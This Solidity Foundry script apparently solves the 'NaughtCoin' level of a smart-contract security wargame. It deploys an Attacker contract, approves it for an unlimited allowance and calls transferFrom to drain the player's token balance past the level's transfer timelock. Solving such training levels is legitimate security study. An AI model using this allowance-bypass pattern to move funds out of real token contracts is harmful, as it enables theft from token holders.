// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/NaughtCoin.sol";
import {Script, console} from "forge-std/script.sol";

contract NaughtCoinSolution is Script {
    NaughtCoin naughtCoin = NaughtCoin(0x9fE69342c10409296F35B27Cb6daE2f9c32a99Ee);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attack = new Attacker();
        console.log("Balance is :", naughtCoin.balanceOf(0x73de6b8e575D8B31A89568e9B3d0b3E89C25d8e5));
        naughtCoin.approve(address(attack), type(uint256).max);
        uint256 amountAllowedToSpend = naughtCoin.allowance(naughtCoin.player(), address(this));
        console.log("Amount Allowed To spend is :", amountAllowedToSpend);
        attack.getMoney();
        console.log("Balance is :", naughtCoin.balanceOf(0x73de6b8e575D8B31A89568e9B3d0b3E89C25d8e5));
        vm.stopBroadcast();
    }
}

contract Attacker {
    NaughtCoin naughtCoin = NaughtCoin(0x9fE69342c10409296F35B27Cb6daE2f9c32a99Ee);

    function getMoney() public {
        naughtCoin.transferFrom(naughtCoin.player(), address(this), 1000000000000000000000000);
    }
}
